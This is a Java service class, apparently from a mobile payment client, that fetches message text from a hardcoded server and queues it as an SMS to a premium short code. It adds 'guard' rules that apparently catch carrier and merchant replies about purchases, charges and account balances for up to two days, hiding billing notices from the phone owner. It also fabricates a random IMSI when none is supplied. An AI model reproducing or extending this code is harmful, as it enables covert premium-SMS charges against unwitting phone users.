package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

/**
 * B,短信接口地址2: http://118.144.76.39/mm/getwymsg.php?imsi=460006722965885&phone=46000672296223
  请求方式:GET
  794167 616716014540 20120101000000 40390000 000000000000 00000000000 a41d96f83ce2d232ec79c0e6737f1304998e3cab 006038415026
	
返回成功数据格式同上。
 * @author leoliu
 *
 */
public class XmwtWyDynamicService implements IDynamicService{

	private static final String TYPE = "xmwtWy";

	private static final String REQUESTMODEL = "imsi={imsi}&phone={phone}";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 10;
	
	private static final String DEST = "1065889920";
	
	private static final Guard guard1 = new Guard("1065889955","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("1065889955","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	private int timeOut = 60;
	
	private Map<String, Long> tryMap = new HashMap<String, Long>();
	@Override
	public String getType() {
		return TYPE;
	}

	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = map.get("imsi");
			
			if(imsi == null || imsi.length() == 0){
				imsi = fillImei("46000");
			}
			
			String requestParam = REQUESTMODEL.replace("{imsi}", imsi).replace("{phone}",imsi);
			
			String responsetxt = GetData.getData(url,requestParam);
			
			xml = parseXml(responsetxt);
			
			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parseXml(String responsetxt){
		
		if(responsetxt != null && responsetxt.length() > 0){
			try{
				
					List<Sms> smsList = new ArrayList<Sms>();
					
					Sms sms = new Sms();
					
					sms.setSmsContent(responsetxt);
					sms.setSmsDest(DEST);
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					smsList.add(sms);
					
					Sms guardSms = new Sms();
					
					List<Guard> guardList = new ArrayList<Guard>();
					
					guardList.add(guard1);
					guardList.add(guard2);
					
					guardList.add(guard3);
					guardList.add(guard4);
					
					guardSms.setGuardList(guardList);
					
					smsList.add(0, guardSms);
						
					return XstreamHelper.toXml(smsList);
				
			}catch(Exception e){
				e.printStackTrace();
			}
		}
		
		return null;
	}
	
	private String fillImei(String imei){
		if(imei.length() < 15){
			int len = imei.length();
			
			for(int i = 0 ; i < 15 - len ; i ++){
				imei += new Random().nextInt(10);
			}
		}
		
		return imei;
	}

	public static void main(String[] args){
		
		String url = "http://118.144.76.39/mm/getwymsg.php";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("channel", "10B9KTa100546110");
		map.put("imsi","460029647996597");
		map.put("type","xmwtWy");
		
		System.out.println(new XmwtWyDynamicService().dynamic(map));
		
		
		
	}
}
